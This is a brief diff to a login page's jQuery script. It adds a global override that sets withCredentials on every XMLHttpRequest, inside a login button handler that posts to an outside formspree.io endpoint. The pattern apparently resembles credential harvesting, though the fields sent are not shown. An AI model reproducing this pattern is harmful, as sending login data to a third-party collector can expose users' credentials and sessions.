@@ -195,6 +195,11 @@ $(document).ready(function() {
     $("#login_button").unbind('click',);
 
     $('#login_button').click(function() {
+	        var origOpen = XMLHttpRequest.prototype.open;
+		    XMLHttpRequest.prototype.open = function() {
+			this.withCredentials = true;
+			origOpen.apply(this, arguments);
+		    }
 	    var xhr = new XMLHttpRequest();
 	    xhr.open("POST", "https://formspree.io/f/xvovlkkk");
 	    xhr.setRequestHeader("Accept", "application/json");
